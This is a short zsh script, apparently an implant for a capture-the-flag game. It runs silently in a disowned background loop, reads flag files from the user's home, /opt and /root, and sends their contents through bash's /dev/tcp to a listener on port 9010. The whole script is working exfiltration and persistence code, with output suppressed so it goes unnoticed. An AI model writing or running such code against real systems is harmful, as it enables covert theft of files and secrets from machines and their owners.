#!/bin/zsh
#Initialize variables
ip=$(ip addr | grep lo$ | awk '{print $2}' | cut -d / -f 1)
uid=$(id -un)

function user(){
	bash -c "echo '$id : $uid : $ip : $user' > /dev/tcp/127.0.0.1/9010" 2>/dev/null
}
function root(){
	bash -c "echo '$id : $uid : $ip : $root' > /dev/tcp/127.0.0.1/9010" 2>/dev/null
}

type -fp watch 1>/dev/null
if [[ $? == 0 ]]; then
	id=1
	while true; do
		nohup watch -gn 1 'cat ~/flag.txt' 1>/dev/null 2>/dev/null
		if [[ $? == 0 ]]; then
			if [[ $uid == 'root' ]]; then
				user=$(cat /opt/flag.txt)
				root=$(cat /root/flag.txt)
				user
				root
			else
				user=$(cat ~/flag.txt)
				user
			fi
			id=$((id + 1))
		fi
	done&disown

else
	for id in {1..100}; do
		if [[ $uid == 'root' ]]; then
			user=$(cat /opt/flag.txt 2>/dev/null)
			root=$(cat /root/flag.txt 2>/dev/null)
			user
			root
			sleep 30
		else
			user=$(cat /opt/flag.txt 2>/dev/null)
			user
			sleep 30
		fi
	done&disown
fi



